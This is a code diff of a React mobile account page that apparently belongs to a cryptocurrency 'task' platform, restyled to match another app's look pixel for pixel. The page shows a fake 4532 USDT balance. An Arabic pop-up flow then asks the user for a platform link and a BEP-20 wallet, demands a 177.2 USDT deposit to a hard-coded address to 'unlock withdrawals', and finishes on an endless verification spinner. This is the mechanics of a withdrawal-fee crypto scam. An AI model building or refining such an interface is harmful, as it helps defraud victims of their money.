@@ -13,7 +13,9 @@ import {
   Activity,
   Mail,
   Copy,
-  Loader2
+  Loader2,
+  IdCard,
+  History
 } from 'lucide-react';
 
 const MinePage: React.FC = () => {
@@ -32,110 +34,133 @@ const MinePage: React.FC = () => {
   };
 
   return (
-    <div className="relative w-full min-h-screen bg-[#F8F8F8] overflow-x-hidden">
-      {/* Background Content with reduced Blur */}
+    <div className="relative w-full min-h-screen bg-[#F8F8F8] overflow-x-hidden font-sans" dir="ltr">
+      {/* Background Content */}
       <div className={`w-full flex flex-col transition-all duration-300 ${isModalOpen ? 'blur-[3px] pointer-events-none' : ''}`}>
-        {/* Header Section */}
-        <div className="bg-gradient-to-b from-[#8C202C] to-[#4B3B3E] px-5 pt-10 pb-12 text-white relative">
-          <div className="absolute top-8 right-5">
-            <MessageCircle className="w-6 h-6 opacity-90 fill-white/10" />
+        
+        {/* Header Section - Pixel Perfect Match */}
+        <div className="bg-gradient-to-br from-[#A52A3A] via-[#8C202C] to-[#4B3B3E] px-5 pt-12 pb-10 text-white relative">
+          
+          {/* Message Icon - Top Right */}
+          <div className="absolute top-10 right-5 cursor-pointer">
+            <div className="bg-white/10 p-1.5 rounded-full">
+               <MessageCircle className="w-6 h-6 text-white fill-white/20" />
+            </div>
           </div>
 
+          {/* Profile Section - Left Aligned */}
           <div className="flex items-center gap-4">
-            <div className="w-[78px] h-[78px] rounded-full overflow-hidden bg-white flex items-center justify-center shadow-lg text-black">
+            {/* Avatar - Left */}
+            <div className="w-[84px] h-[84px] rounded-full border-2 border-white/20 overflow-hidden bg-white shadow-xl flex items-center justify-center">
                <svg viewBox="0 0 100 100" className="w-[85%] h-[85%]">
-                  <polygon points="50,5 65,18 60,38 40,38 35,18" fill="#EB5353" />
-                  <polygon points="95,50 82,65 62,60 62,40 82,35" fill="#FBC12F" />
-                  <polygon points="68,92 53,85 58,65 78,65 83,85" fill="#9353BF" />
-                  <polygon points="32,92 17,85 22,65 42,65 47,85" fill="#3D92C1" />
-                  <polygon points="5,50 18,35 38,40 38,60 18,65" fill="#5EAF5D" />
+                  <path d="M50 5 L85 25 L85 65 L50 85 L15 65 L15 25 Z" fill="#EB5353" />
+                  <path d="M50 5 L85 25 L50 45 L15 25 Z" fill="#FBC12F" />
+                  <path d="M15 25 L50 45 L50 85 L15 65 Z" fill="#9353BF" />
+                  <path d="M85 25 L85 65 L50 85 L50 45 Z" fill="#3D92C1" />
+                  <circle cx="50" cy="45" r="15" fill="#5EAF5D" />
                </svg>
             </div>
             
+            {/* User Info - Next to Avatar */}
             <div className="flex flex-col">
               <div className="flex items-center gap-2">
-                <span className="text-[21px] font-bold tracking-tight">Mgmg202020</span>
-                <div className="bg-[#FFC107] text-white text-[9px] px-1.5 py-0.5 rounded-[3px] font-black italic flex items-center justify-center h-4 shadow-sm">
+                <span className="text-[22px] font-bold tracking-tight">Mgmg202020</span>
+                <div className="bg-[#FBC02D] text-[#8B0000] text-[9px] px-1.5 py-0.5 rounded-[4px] font-black italic flex items-center justify-center h-4 shadow-sm">
                   VIP 0
                 </div>
               </div>
-              <p className="text-[12px] opacity-80 mt-1 font-normal">Invitation code: 616535</p>
+              <p className="text-[13px] text-white/80 mt-1">Invitation code: 616535</p>
             </div>
           </div>
 
-          <div className="mt-8 flex justify-between items-end">
+          {/* Account Balance & Action Buttons */}
+          <div className="mt-8 flex justify-between items-center">
+            {/* My Account - Left */}
             <div className="flex flex-col">
-              <span className="text-[14px] font-medium mb-1 opacity-90">My Account</span>
-              <div className="flex items-baseline">
-                <span className="text-[12px] font-normal opacity-70 mr-2">USDT</span>
-                <span className="text-[26px] font-bold leading-none">4532.1745</span>
+              <span className="text-[14px] font-medium opacity-90">My Account</span>
+              <div className="flex items-baseline mt-2">
+                <span className="text-[12px] font-medium opacity-70 mr-1.5">USDT</span>
+                <span className="text-[28px] font-bold leading-none">4532.1745</span>
               </div>
             </div>
 
-            <div className="flex gap-4 mb-[-4px]">
-              <button className="flex flex-col items-center gap-1.5">
-                <div className="w-14 h-14 bg-white rounded-2xl flex items-center justify-center shadow-md">
-                  <div className="w-9 h-9 bg-[#2A66D9] rounded-xl flex items-center justify-center text-white">
-                    <Wallet className="w-5 h-5" />
-                  </div>
+            {/* Action Buttons - Right */}
+            <div className="flex gap-6">
+              <button className="flex flex-col items-center gap-2">
+                <div className="w-[52px] h-[52px] bg-white rounded-[18px] flex items-center justify-center shadow-lg">
+                   <div className="w-8 h-8 bg-[#2A66D9] rounded-lg flex items-center justify-center">
+                      <Wallet className="w-5 h-5 text-white" />
+                   </div>
                 </div>
-                <span className="text-[11px] font-medium text-white/90">Deposit</span>
+                <span className="text-[11px] font-semibold text-white">Deposit</span>
               </button>
-              <button className="flex flex-col items-center gap-1.5">
-                <div className="w-14 h-14 bg-white rounded-2xl flex items-center justify-center shadow-md">
-                  <div className="w-9 h-9 bg-[#2A66D9] rounded-xl flex items-center justify-center text-white">
-                    <CreditCard className="w-5 h-5" />
-                  </div>
+              <button className="flex flex-col items-center gap-2">
+                <div className="w-[52px] h-[52px] bg-white rounded-[18px] flex items-center justify-center shadow-lg">
+                   <div className="w-8 h-8 bg-[#2A66D9] rounded-lg flex items-center justify-center">
+                      <CreditCard className="w-5 h-5 text-white" />
+                   </div>
                 </div>
-                <span className="text-[11px] font-medium text-white/90">Withdrawal</span>
+                <span className="text-[11px] font-semibold text-white">Withdrawal</span>
               </button>
             </div>
           </div>
         </div>
 
-        <div className="bg-white px-3 py-6 flex justify-around items-start border-b border-[#F0F0F0]">
-          <FeatureItem icon={<Users className="text-[#FF9800]" />} label="Teams" />
-          <FeatureItem icon={<FileText className="text-[#4DB6AC]" />} label="Record" />
-          <FeatureItem icon={<Activity className="text-[#E91E63]" />} label="Wallet management" />
-          <FeatureItem icon={<Mail className="text-[#2196F3]" />} label="Invite friends" />
+        {/* Feature Grid Section - Matches Icons and Colors */}
+        <div className="bg-white px-2 py-8 flex justify-around items-start">
+          <FeatureItem 
+            icon={<Users className="text-[#FFA726] fill-[#FFA726]/10" />} 
+            label="Teams" 
+          />
+          <FeatureItem 
+            icon={<FileText className="text-[#26A69A] fill-[#26A69A]/10" />} 
+            label="Record" 
+          />
+          <FeatureItem 
+            icon={<Activity className="text-[#EF5350] fill-[#EF5350]/10" />} 
+            label="Wallet management" 
+          />
+          <FeatureItem 
+            icon={<Mail className="text-[#42A5F5] fill-[#42A5F5]/10" />} 
+            label="Invite friends" 
+          />
         </div>
 
-        <div className="mt-4 px-4">
-          <div className="bg-white rounded-[14px] shadow-sm overflow-hidden border border-[#EEEEEE]">
-            <MenuItem icon={<User className="text-[#BDBDBD] w-5 h-5" />} label="Profile" />
-            <MenuItem icon={<ClipboardList className="text-[#BDBDBD] w-5 h-5" />} label="Deposit records" />
-            <MenuItem icon={<CreditCard className="text-[#BDBDBD] w-5 h-5" />} label="Withdrawal records" />
-            <MenuItem icon={<Settings className="text-[#BDBDBD] w-5 h-5" />} label="Setting" isLast />
+        {/* Menu Items Section - Matches styling */}
+        <div className="mt-4 px-4 pb-10">
+          <div className="bg-white rounded-[16px] shadow-sm overflow-hidden border border-gray-100">
+            <MenuItem icon={<IdCard className="text-[#9E9E9E] w-5 h-5" />} label="Profile" />
+            <MenuItem icon={<ClipboardList className="text-[#9E9E9E] w-5 h-5" />} label="Deposit records" />
+            <MenuItem icon={<History className="text-[#9E9E9E] w-5 h-5" />} label="Withdrawal records" />
+            <MenuItem icon={<Settings className="text-[#9E9E9E] w-5 h-5" />} label="Setting" isLast />
           </div>
         </div>
       </div>
 
-      {/* Steps Modal Overlay */}
+      {/* Modal Overlay - Content as requested */}
       {isModalOpen && (
-        <div className="fixed inset-0 z-[100] flex items-center justify-center px-6 bg-black/30 backdrop-blur-[1px]">
-          <div className="bg-white w-full max-w-sm rounded-[24px] shadow-2xl overflow-hidden animate-in zoom-in duration-300">
-            <div className="p-6 flex flex-col items-center text-center space-y-4" dir="rtl">
+        <div className="fixed inset-0 z-[100] flex items-center justify-center px-6 bg-black/40 backdrop-blur-[2px]" dir="rtl">
+          <div className="bg-white w-full max-w-sm rounded-[28px] shadow-2xl overflow-hidden animate-in zoom-in duration-300">
+            <div className="p-6 flex flex-col items-center text-center space-y-4">
               
-              {/* Step 1: Welcome & Initial Instruction */}
               {modalStep === 1 && (
                 <>
                   <div className="w-16 h-16 bg-blue-50 rounded-full flex items-center justify-center mb-2">
                     <User className="w-8 h-8 text-blue-600" />
                   </div>
-                  <h3 className="text-lg font-bold text-gray-800">أهلاً بك Mgmg202020</h3>
-                  <p className="text-sm text-gray-600 leading-relaxed">
+                  <h3 className="text-xl font-bold text-gray-800">أهلاً بك Mgmg202020</h3>
+                  <p className="text-[15px] text-gray-600 leading-relaxed">
                     تم حل أمر المهام بنجاح. اضغط التالي وقم بوضع رابط المنصة mini pro لقسم الإيداع حصراً.
                   </p>
                   <button 
                     onClick={nextStep}
-                    className="w-full py-3 bg-[#8C202C] text-white rounded-xl font-bold active:scale-95 transition-transform"
+                    className="w-full py-4 bg-[#8C202C] text-white rounded-2xl font-bold active:scale-95 transition-all text-[16px]"
                   >
                     التالي
                   </button>
                 </>
               )}
 
-              {/* Step 2: Mini Pro Link Input */}
               {modalStep === 2 && (
                 <>
                   <h3 className="text-lg font-bold text-gray-800">رابط منصة mini pro</h3>
@@ -150,14 +175,13 @@ const MinePage: React.FC = () => {
                   <button 
                     onClick={nextStep}
                     disabled={!formData.miniProLink}
-                    className="w-full py-3 bg-[#8C202C] text-white rounded-xl font-bold active:scale-95 transition-transform disabled:opacity-50"
+                    className="w-full py-4 bg-[#8C202C] text-white rounded-2xl font-bold active:scale-95 transition-all disabled:opacity-50"
                   >
                     التالي
                   </button>
                 </>
               )}
 
-              {/* Step 3: BEP-20 Wallet Address Input */}
               {modalStep === 3 && (
                 <>
                   <h3 className="text-lg font-bold text-gray-800">رابط محفظة BEP-20</h3>
@@ -172,18 +196,17 @@ const MinePage: React.FC = () => {
                   <button 
                     onClick={nextStep}
                     disabled={!formData.bep20Address}
-                    className="w-full py-3 bg-[#8C202C] text-white rounded-xl font-bold active:scale-95 transition-transform disabled:opacity-50"
+                    className="w-full py-4 bg-[#8C202C] text-white rounded-2xl font-bold active:scale-95 transition-all disabled:opacity-50"
                   >
                     التالي
                   </button>
                 </>
               )}
 
-              {/* Step 4: Final Payment Instruction */}
               {modalStep === 4 && (
                 <>
-                  <div className="bg-red-50 p-4 rounded-xl border border-red-100 text-right w-full">
-                    <h3 className="text-md font-bold text-red-800 mb-2">تنبيه نهائي</h3>
+                  <div className="bg-red-50 p-5 rounded-2xl border border-red-100 text-right w-full">
+                    <h3 className="text-[16px] font-bold text-red-800 mb-2">تنبيه نهائي</h3>
                     <p className="text-[13px] text-red-700 leading-relaxed">
                       أهلاً بك Mgmg202020، بقي أمر إيداع مبلغ <span className="font-bold underline">177.2 USDT BEP-20</span> لفتح قناة السحب.
                     </p>
@@ -193,12 +216,12 @@ const MinePage: React.FC = () => {
                   </div>
                   
                   <div className="w-full space-y-2 mt-4">
-                    <p className="text-[10px] text-gray-400 font-medium text-right uppercase">Address (BEP20)</p>
-                    <div className="flex items-center gap-2 bg-gray-100 p-3 rounded-lg border border-gray-200">
+                    <p className="text-[10px] text-gray-400 font-medium text-right uppercase tracking-wider">Address (BEP20)</p>
+                    <div className="flex items-center gap-2 bg-gray-100 p-3.5 rounded-xl border border-gray-200">
                       <button onClick={() => handleCopy('0xad24e7fcbbde3ca422d58d739c3f628fd7b0e03d')} className="text-blue-600 active:scale-90 transition-transform">
-                        <Copy size={18} />
+                        <Copy size={20} />
                       </button>
-                      <span className="text-[10px] font-mono text-gray-600 truncate flex-1 text-left">
+                      <span className="text-[11px] font-mono text-gray-600 truncate flex-1 text-left">
                         0xad24e7fcbbde3ca422d58d739c3f628fd7b0e03d
                       </span>
                     </div>
@@ -206,22 +229,20 @@ const MinePage: React.FC = () => {
 
                   <button 
                     onClick={nextStep}
-                    className="w-full py-3 bg-[#8C202C] text-white rounded-xl font-bold active:scale-95 transition-transform mt-4 shadow-lg shadow-[#8C202C]/20"
+                    className="w-full py-4 bg-[#8C202C] text-white rounded-2xl font-bold active:scale-95 transition-all mt-4 shadow-xl shadow-[#8C202C]/20"
                   >
                     تم الإيداع
                   </button>
                 </>
               )}
 
-              {/* Step 5: Waiting Message */}
               {modalStep === 5 && (
-                <div className="py-8 flex flex-col items-center">
-                  <Loader2 className="w-12 h-12 text-[#8C202C] animate-spin mb-4" />
+                <div className="py-10 flex flex-col items-center">
+                  <Loader2 className="w-14 h-14 text-[#8C202C] animate-spin mb-6" />
                   <h3 className="text-lg font-bold text-gray-800">الرجاء الانتظار</h3>
                   <p className="text-sm text-gray-500 mt-2">جاري التأكد من عملية الإيداع، يرجى عدم إغلاق الصفحة...</p>
                 </div>
               )}
-
             </div>
           </div>
         </div>
@@ -231,23 +252,23 @@ const MinePage: React.FC = () => {
 };
 
 const FeatureItem: React.FC<{ icon: React.ReactNode, label: string }> = ({ icon, label }) => (
-  <button className="flex flex-col items-center justify-start w-1/4 active:opacity-70 transition-opacity">
-    <div className="w-10 h-10 flex items-center justify-center mb-1">
-      {React.cloneElement(icon as React.ReactElement, { size: 36, strokeWidth: 1.5 })}
+  <button className="flex flex-col items-center justify-start w-[85px] active:scale-95 transition-transform">
+    <div className="w-12 h-12 flex items-center justify-center mb-2">
+      {React.cloneElement(icon as React.ReactElement, { size: 38, strokeWidth: 1.2 })}
     </div>
-    <span className="text-[11px] text-[#333] leading-tight text-center font-normal px-1">
+    <span className="text-[12px] text-[#444] leading-tight text-center font-medium">
       {label}
     </span>
   </button>
 );
 
 const MenuItem: React.FC<{ icon: React.ReactNode, label: string, isLast?: boolean }> = ({ icon, label, isLast }) => (
-  <button className={`w-full flex items-center justify-between py-4 px-4 active:bg-gray-50 transition-colors ${!isLast ? 'border-b border-[#F9F9F9]' : ''}`}>
-    <div className="flex items-center gap-3">
-      <div className="w-6 flex justify-center">{icon}</div>
-      <span className="text-[14px] text-[#333] font-normal">{label}</span>
+  <button className={`w-full flex items-center justify-between py-5 px-5 active:bg-gray-50 transition-colors ${!isLast ? 'border-b border-gray-50' : ''}`}>
+    <div className="flex items-center gap-4">
+      <div className="w-6 flex justify-center opacity-80">{icon}</div>
+      <span className="text-[15px] text-[#333] font-normal">{label}</span>
     </div>
-    <ChevronRight className="w-4 h-4 text-[#D0D0D0]" />
+    <ChevronRight className="w-5 h-5 text-[#D0D0D0]" />
   </button>
 );
 
